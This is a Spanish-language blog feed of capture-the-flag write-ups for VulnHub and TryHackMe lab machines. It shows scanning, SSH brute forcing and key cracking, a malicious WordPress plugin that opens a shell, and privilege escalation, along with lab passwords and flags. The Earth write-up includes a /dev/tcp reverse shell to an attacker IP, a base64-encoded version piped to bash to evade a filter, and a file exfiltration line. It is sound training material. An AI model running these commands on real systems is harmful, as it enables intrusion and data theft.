<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-08-09T14:19:48+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">TheZombrex</title><subtitle>TheZombrex blog</subtitle><author><name>TheZombrex</name></author><entry><title type="html">The Planets: Earth</title><link href="http://localhost:4000/vulnhub/the_planets_earth/" rel="alternate" type="text/html" title="The Planets: Earth" /><published>2022-08-09T00:00:00+02:00</published><updated>2022-08-09T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/the_planets_earth</id><content type="html" xml:base="http://localhost:4000/vulnhub/the_planets_earth/"><![CDATA[<p><a href="https://www.vulnhub.com/entry/the-planets-earth,755/">https://www.vulnhub.com/entry/the-planets-earth,755/</a></p>

<p>Realizar un escaneo nmap a la red para buscar el equipo</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 192.168.122.0/24
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/1.png" alt="image-center" class="align-center" /></p>

<p>Saldrá una máquina con varios puertos abiertos</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/2.png" alt="image-center" class="align-center" /></p>

<p>Realizar un escaneo nmap profundo a la IP que aparece</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span>  <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">--script</span> vuln <span class="nt">-Pn</span> 192.168.122.11 <span class="nt">-oG</span> allports
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/3.png" alt="image-center" class="align-center" /></p>

<p>Aparecerán los puertos <code class="language-plaintext highlighter-rouge">22,80,443</code> abiertos</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/4.png" alt="image-center" class="align-center" /></p>

<p>Aparecerán bastantes vulnerabilidades, entre ellas se mostrarán dos DNS que habra que poner en <code class="language-plaintext highlighter-rouge">/etc/hosts</code> apuntando a la IP de la máquina victima</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/5.png" alt="image-center" class="align-center" /></p>

<p>Editar el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para añadir las DNS</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nano /etc/hosts
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/6.png" alt="image-center" class="align-center" /></p>

<p>Entrar a la web como <code class="language-plaintext highlighter-rouge">earth.local</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/7.png" alt="image-center" class="align-center" /></p>

<p>Realizar un escaneo nmap a ambas DNS como https</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> https://earth.local <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-k</span>
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/8.png" alt="image-center" class="align-center" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> https://terratest.earth.local <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-k</span>
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/9.png" alt="image-center" class="align-center" /></p>

<p>Reportará que hay un <code class="language-plaintext highlighter-rouge">robots.txt</code>, acceder a él. Mostrará una lista de directorios.</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/10.png" alt="image-center" class="align-center" /></p>

<p>Ir a <code class="language-plaintext highlighter-rouge">/testingnotes.txt</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/11.png" alt="image-center" class="align-center" /></p>

<p>Ir a <code class="language-plaintext highlighter-rouge">testdata.txt</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/12.png" alt="image-center" class="align-center" /></p>

<p>Usar cyberchef para desencriptar los mensajes de earth.local usando como clave el texto de <code class="language-plaintext highlighter-rouge">testdata.txt</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/13.png" alt="image-center" class="align-center" /></p>

<p>Mostrará un menaje repetido bastantes veces que es earthclimatechangebad4humans
Usar ese resultado como contraseña en <code class="language-plaintext highlighter-rouge">earth.local/admin/login</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Usuario: terra
Contraseña: earthclimatechangebad4humans
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/14.png" alt="image-center" class="align-center" /></p>

<p>Al intentar hacer un reverse shell mostrará que no están permitidas las conexiones, esto es porque detecta que se está introduciendo un comando de reverse shell</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/192.168.122.13/4444 0&gt;&amp;1
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/15.png" alt="image-center" class="align-center" /></p>

<p>Encriptar el comando con base64</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"/bin/bash -i &gt;&amp; /dev/tcp/192.168.122.13/4444 0&gt;&amp;1"</span> | <span class="nb">base64</span>
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/16.png" alt="image-center" class="align-center" /></p>

<p>Poner el puerto en escucha</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 4444
</code></pre></div></div>

<p>IMPORTANTE: Utilizo <code class="language-plaintext highlighter-rouge">ncwrap</code> que es un alias que he asignado al comando “<code class="language-plaintext highlighter-rouge">rlwrap nc</code>”, para poder usar un shell inverso mejorado.</p>

<p>Para poder usarlo instalar <code class="language-plaintext highlighter-rouge">rlwrap</code> con <code class="language-plaintext highlighter-rouge">sudo apt install -y rlwrap</code> y opcionalmente crear un alias que al escribirlo ejecute “<code class="language-plaintext highlighter-rouge">rlwrap nc</code>”</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/17.png" alt="image-center" class="align-center" /></p>

<p>Mandar ese comando encriptado indicando que después se desencripte y ejecute</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTIyLjEzLzQ0NDQgMD4mMQo='</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/18.png" alt="image-center" class="align-center" /></p>

<p>Se abrirá un shell inverso</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/19.png" alt="image-center" class="align-center" /></p>

<p>Al ir a <code class="language-plaintext highlighter-rouge">/var</code> se podrá ver un directorio llamado <code class="language-plaintext highlighter-rouge">earth_web</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /var
<span class="nb">ls</span> –la
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/20.png" alt="image-center" class="align-center" /></p>

<p>Ir a <code class="language-plaintext highlighter-rouge">earth_web</code> y mostrar el contenido</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>earth_web
<span class="nb">ls</span> <span class="nt">-la</span>
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/21.png" alt="image-center" class="align-center" /></p>

<p>Leer el archivo <code class="language-plaintext highlighter-rouge">user_flag.txt</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>user_flag.txt
Flag: <span class="o">[</span>user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/22.png" alt="image-center" class="align-center" /></p>

<p>Buscar archivos en el sistema con permisos especiales para el usuario actual</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s 2&gt;/dev/null
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/23.png" alt="image-center" class="align-center" /></p>

<p>Saldrá un archivo llamado <code class="language-plaintext highlighter-rouge">reset_root</code>, al ejecutarlo mostrará un error</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/24.png" alt="image-center" class="align-center" /></p>

<p>Al intentar hacer un <code class="language-plaintext highlighter-rouge">cat</code> al archivo este será ilegible</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/25.png" alt="image-center" class="align-center" /></p>

<p>Por esto será necesario mandar el archivo al equipo atacante para poder revisarlo.</p>

<p>Primero se pondrá un puerto en escucha esperando por la información del archivo y que lo guardará en el equipo:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 9002 <span class="o">&gt;</span> reset_root
</code></pre></div></div>

<p>Luego mandar el archivo:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /usr/bin/reset_root <span class="o">&gt;</span> /dev/tcp/192.168.122.13/9002
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/26.png" alt="image-center" class="align-center" /></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/27.png" alt="image-center" class="align-center" /></p>

<p>Se recibirá correctamente y el <code class="language-plaintext highlighter-rouge">nc</code> se cerrará</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/28.png" alt="image-center" class="align-center" /></p>

<p>Dar permisos de ejecución al archivo <code class="language-plaintext highlighter-rouge">reset_root</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/29.png" alt="image-center" class="align-center" /></p>

<p>Asegurar que se tiene instalado <code class="language-plaintext highlighter-rouge">strace</code>, sino instalarlo</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install</span> –y strace
</code></pre></div></div>

<p>Comprobar el contenido del archivo <code class="language-plaintext highlighter-rouge">reset_root</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strace <span class="nt">-f</span> ./reset_root
</code></pre></div></div>

<p>Entre todo el contenido mostrará unas líneas que comprueban si existen unos archivos, de existir entonces el script cambia la contraseña del usuario root.</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/30.png" alt="image-center" class="align-center" /></p>

<p>Crear los archivos en el equipo víctima</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">touch</span> /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5 /tmp/kcM0Wewe
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/31.png" alt="image-center" class="align-center" /></p>

<p>Ejecutar de nuevo el archivo <code class="language-plaintext highlighter-rouge">reset_root</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/reset_root
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/32.png" alt="image-center" class="align-center" /></p>

<p>Ahora habrá cambiado la contraseña de <code class="language-plaintext highlighter-rouge">root</code> a <code class="language-plaintext highlighter-rouge">Earth</code></p>

<p>Cambiar al usuario <code class="language-plaintext highlighter-rouge">root</code> con la contraseña <code class="language-plaintext highlighter-rouge">Earth</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/33.png" alt="image-center" class="align-center" /></p>

<p>Comprobar que el usuario es root</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span>
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/34.png" alt="image-center" class="align-center" /></p>

<p>Ir al directorio de root y mostrar el contenido</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /root
<span class="nb">ls</span> –la
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/35.png" alt="image-center" class="align-center" /></p>

<p>Leer el archivo <code class="language-plaintext highlighter-rouge">root_flag.txt</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>root_flag.txt
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/earth/36.png" alt="image-center" class="align-center" /></p>

<h2 id="flags">Flags</h2>

<p>Usuario: [user_flag_3353b67d6437f07ba7d34afd7d2fc27d]</p>

<p>Root: [root_flag_b0da9554d29db2117b02aa8b66ec492e]</p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de The Planets: Earth.]]></summary></entry><entry><title type="html">Basic Pentesting</title><link href="http://localhost:4000/tryhackme/basic-pentesting/" rel="alternate" type="text/html" title="Basic Pentesting" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/tryhackme/basic-pentesting</id><content type="html" xml:base="http://localhost:4000/tryhackme/basic-pentesting/"><![CDATA[<h1 id="preguntas">Preguntas</h1>

<p><strong>What does the acronym VM stand for?</strong></p>

<p>virtual machine</p>

<p><strong>What is the name of the hidden directory on the web server(enter name without /)?</strong></p>

<p>Development</p>

<p><strong>What is the username?</strong></p>

<p>Jan</p>

<p><strong>What is the password?</strong></p>

<p>armando</p>

<p><strong>What service do you use to access the server(answer in abbreviation in all caps)?</strong></p>

<p>SSH</p>

<p><strong>What is the name of the other user you found(all lower case)?</strong></p>

<p>Kay</p>

<p><strong>What is the final password you obtain?</strong></p>

<p>heresareallystrongpasswordthatfollowsthepasswordpolicy$$</p>

<h1 id="proceso">Proceso</h1>

<p>Listar todos los directorios ocultos de la web</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> 10.10.35.80 <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-x</span> html,php,txt
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/1.png" alt="image-center" class="align-center" /></p>

<p>Listar los usuarios del sistema</p>

<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/2.png" alt="image-center" class="align-center" /></p>

<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/3.png" alt="image-center" class="align-center" /></p>

<p>Listar los recursos compartidos por SMB</p>

<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/4.png" alt="image-center" class="align-center" /></p>

<p>Entrar al recurso compartido de Anonymous y mostrar el contenido</p>

<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/5.png" alt="image-center" class="align-center" /></p>

<p>Usar <code class="language-plaintext highlighter-rouge">hydra</code> para encontrar la contraseña de jay</p>

<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/6.png" alt="image-center" class="align-center" /></p>

<p>Entrar por ssh con el usuario jay y la contraseña descubierta</p>

<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/7.png" alt="image-center" class="align-center" /></p>

<p>Ir al directorio home, luego al directorio personal de kay y al directorio <code class="language-plaintext highlighter-rouge">.ssh</code>, dentro se encontrará la clave privada del usuario</p>

<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/8.png" alt="image-center" class="align-center" /></p>

<p>Leer el archivo de la clave privada <code class="language-plaintext highlighter-rouge">id_rsa</code> y copiar el contenido</p>

<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/9.png" alt="image-center" class="align-center" /></p>

<p>Guardar el contenido en un archivo del equipo atacante</p>

<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/10.png" alt="image-center" class="align-center" /></p>

<p>Convertirlo a hash con la herramienta <code class="language-plaintext highlighter-rouge">ssh2john.py</code> y guardarlo en otro archivo nuevo</p>

<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/11.png" alt="image-center" class="align-center" /></p>

<p>Crackear la contraseña con <code class="language-plaintext highlighter-rouge">john</code>, servirán tanto rockyou como dark0de</p>

<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/12.png" alt="image-center" class="align-center" /></p>

<p>Entrar por ssh usando la clave privada e introduciendo la contraseña crackeada</p>

<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/13.png" alt="image-center" class="align-center" /></p>

<p>Ir al directorio personal de Kay y leer el archivo <code class="language-plaintext highlighter-rouge">pass.bak</code></p>

<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/14.png" alt="image-center" class="align-center" /></p>]]></content><author><name>TheZombrex</name></author><category term="tryhackme" /><category term="tryhackme" /><category term="writeup" /><summary type="html"><![CDATA[[Academy][TryHackMe] Writeup de Basic Pentesting.]]></summary></entry><entry><title type="html">Deathnote</title><link href="http://localhost:4000/vulnhub/deathnote/" rel="alternate" type="text/html" title="Deathnote" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/deathnote</id><content type="html" xml:base="http://localhost:4000/vulnhub/deathnote/"><![CDATA[<p><a href="https://www.vulnhub.com/entry/deathnote-1,739/">https://www.vulnhub.com/entry/deathnote-1,739/</a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> 192.168.1.0/24
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/1.png" alt="image-center" class="align-center" /></p>

<p>Saldrá una IP con los puertos 80 y 22 abiertos</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/2.png" alt="image-center" class="align-center" /></p>

<p>Al intentar entrar a la web saldrá un mensaje que dice Please wait y se redireccionará a una web de wordpress.</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/3.png" alt="image-center" class="align-center" /></p>

<p>Realizar un escaneo de todos los directorios del sitio con gobuster</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/4.png" alt="image-center" class="align-center" /></p>

<p>Ir a <code class="language-plaintext highlighter-rouge">/robots.txt</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/5.png" alt="image-center" class="align-center" />
<img src="http://localhost:4000/assets/images/vulnhub/deathnote/6.png" alt="image-center" class="align-center" /></p>

<p>Ir a <code class="language-plaintext highlighter-rouge">/important.jpg</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/7.png" alt="image-center" class="align-center" /></p>

<p>Dirá que la imagen no se puede cargar por contener errores así que procedemos a descargar ese archivo a nuestro equipo usando <code class="language-plaintext highlighter-rouge">wget</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/8.png" alt="image-center" class="align-center" /></p>

<p>Comprobar que el archivo es realmente una imagen en jpg</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/9.png" alt="image-center" class="align-center" /></p>

<p>Dirá que realmente es un documento de texto al que se le ha cambiado el nombre para hacer parecer que es una imagen.</p>

<p>Leer el archivo <code class="language-plaintext highlighter-rouge">important.jpg</code>, no es necesario cambiar su extensión para que cat lo reconozca.</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/10.png" alt="image-center" class="align-center" /></p>

<p>Dirá que miremos en <code class="language-plaintext highlighter-rouge">/user.txt</code>, tambien que la contraseña puede estar en el lugar de la pista</p>

<p>Entrar a la web y darle click al Hint</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/11.png" alt="image-center" class="align-center" /></p>

<p>Dirá que busquemos un archivo llamado <code class="language-plaintext highlighter-rouge">notes.txt</code> en el servidor o leamos el comentario de L</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/12.png" alt="image-center" class="align-center" /></p>

<p>Mirar el comentario de L</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/13.png" alt="image-center" class="align-center" /></p>

<p>Probar a acceder desde el login con el usuario Kira y la contraseña iamjustic3</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/14.png" alt="image-center" class="align-center" /></p>

<p>Dará acceso al panel de administrador de Wordpress</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/15.png" alt="image-center" class="align-center" /></p>

<p>Probar a entrar al editor de temas para modificar el de 404, mostrará que no es posible</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/16.png" alt="image-center" class="align-center" /></p>

<p>Utilizar <code class="language-plaintext highlighter-rouge">malicious-wordpress-plugin</code> para crear un plugin que abrirá un shell inverso</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python wordpwn.py 192.168.122.5 4444 Y
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/17.png" alt="image-center" class="align-center" /></p>

<p>Quedará en el puerto de escucha y se generará un archivo zip que será el plugin</p>

<p>Subir el plugin al sitio de wordpress</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/18.png" alt="image-center" class="align-center" />
<img src="http://localhost:4000/assets/images/vulnhub/deathnote/19.png" alt="image-center" class="align-center" /></p>

<p>Activar el plugin</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/20.png" alt="image-center" class="align-center" /></p>

<p>Ir al editor de plugins y seleccionar GotEm</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/21.png" alt="image-center" class="align-center" /></p>

<p>Ir a la ruta del plugin</p>

<p>http://192.168.122.7/wordpress/wp-content/plugins/malicious/wetw0rk_maybe.php</p>

<p>Se abrirá un shell inverso con meterpreter</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/22.png" alt="image-center" class="align-center" /></p>

<p>Entrar en modo shell con el comando <code class="language-plaintext highlighter-rouge">shell</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/21.png" alt="image-center" class="align-center" /></p>

<p>Comprobar que el usuario es <code class="language-plaintext highlighter-rouge">www-data</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/22.png" alt="image-center" class="align-center" /></p>

<p>Ir al directorio home y mostrar contenido para ver los usuarios, se mostraran el usuario kira y el usuario l</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/23.png" alt="image-center" class="align-center" /></p>

<p>Entrar en el directorio de kira, mostrar el contenido e intentar leer el archivo <code class="language-plaintext highlighter-rouge">kira.txt</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/24.png" alt="image-center" class="align-center" /></p>

<p>Volver atrás e intentar lo mismo en el directorio de <code class="language-plaintext highlighter-rouge">l</code>, mostrar el contenido de <code class="language-plaintext highlighter-rouge">user.txt</code>, mostrará un texto cifrado en Brainfuck</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/25.png" alt="image-center" class="align-center" /></p>

<p>Descifrar el mensaje usando la web de dcode.fr, mostrará el mensaje “i think u got the shell, but you wont be able to kill me -kira”</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/26.png" alt="image-center" class="align-center" /></p>

<p>Volver al panel de wordpress e investigar más, en la sección de media se encontrará el archivo <code class="language-plaintext highlighter-rouge">notes.txt</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/27.png" alt="image-center" class="align-center" /></p>

<p>Parece ser un diccionario de posibles claves, descargarlo</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/28.png" alt="image-center" class="align-center" /></p>

<p>Usar <code class="language-plaintext highlighter-rouge">hydra</code> para encontrar cuál de las contraseñas es del usuario L en <code class="language-plaintext highlighter-rouge">ssh</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>hydra <span class="nt">-t</span> 4 <span class="nt">-l</span> l <span class="nt">-P</span> Downloads/notes.txt 192.168.122.7 ssh
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/29.png" alt="image-center" class="align-center" /></p>

<p>Usuario: l
Contraseña: death4me</p>

<p>Entrar por <code class="language-plaintext highlighter-rouge">ssh</code> con el usuario l y la contraseña death4me</p>

<p>Ir al directorio <code class="language-plaintext highlighter-rouge">/opt</code> y mostrar el contenido</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/30.png" alt="image-center" class="align-center" /></p>

<p>Ir al directorio y mostrar el contenido</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/31.png" alt="image-center" class="align-center" /></p>

<p>Ir al directorio <code class="language-plaintext highlighter-rouge">fake-notebook-rule/</code> y mostrar el contenido, el archivo <code class="language-plaintext highlighter-rouge">hint</code> dirá que se use cyberchef aunque no es necesario</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/32.png" alt="image-center" class="align-center" /></p>

<p>Comprobar el tipo de archivo de <code class="language-plaintext highlighter-rouge">case.wav</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/33.png" alt="image-center" class="align-center" /></p>

<p>Leer el archivo <code class="language-plaintext highlighter-rouge">case.wav</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/34.png" alt="image-center" class="align-center" /></p>

<p>Usar dcode.fr para descifrar el contenido</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/35.png" alt="image-center" class="align-center" /></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/36.png" alt="image-center" class="align-center" /></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/37.png" alt="image-center" class="align-center" /></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/38.png" alt="image-center" class="align-center" /></p>

<p>Ir al directorio <code class="language-plaintext highlighter-rouge">kira-case/</code>, el archivo case-file.txt no mostrará nada relevante</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/39.png" alt="image-center" class="align-center" /></p>

<p>Cambiar al usuario kira con la contraseña del mensaje cifrado anterior</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/40.png" alt="image-center" class="align-center" /></p>

<p>Mostrar que permisos tiene el usuario con el comando</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
</code></pre></div></div>

<p>Mostrará que puede ejecutar todo, esto significa que puede cambiar a usuario root sin necesidad de introducir contraseña</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/41.png" alt="image-center" class="align-center" /></p>

<p>Cambiar al usuario root</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/42.png" alt="image-center" class="align-center" /></p>

<p>Ir al directorio de root y mostrar el contenido</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/43.png" alt="image-center" class="align-center" /></p>

<p>Leer el contenido de <code class="language-plaintext highlighter-rouge">root.txt</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/44.png" alt="image-center" class="align-center" /></p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Deathnote.]]></summary></entry><entry><title type="html">Evilbox</title><link href="http://localhost:4000/vulnhub/evilbox/" rel="alternate" type="text/html" title="Evilbox" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/evilbox</id><content type="html" xml:base="http://localhost:4000/vulnhub/evilbox/"><![CDATA[<p><a href="https://www.vulnhub.com/entry/odin-1,619/">https://www.vulnhub.com/entry/odin-1,619//</a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 192.168.122.0/24
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/1.png" alt="image-center" class="align-center" /></p>

<p>Saldrá una IP con los puertos 80 y 22 abiertos</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/2.png" alt="image-center" class="align-center" /></p>

<p>Al entrar en la web aparecerá la página por defecto de Apache y no se mostrará nada en el código fuente</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/3.png" alt="image-center" class="align-center" /></p>

<p>Escanear todos los directorios ocultos</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> –u 192.168.122.14 <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/4.png" alt="image-center" class="align-center" /></p>

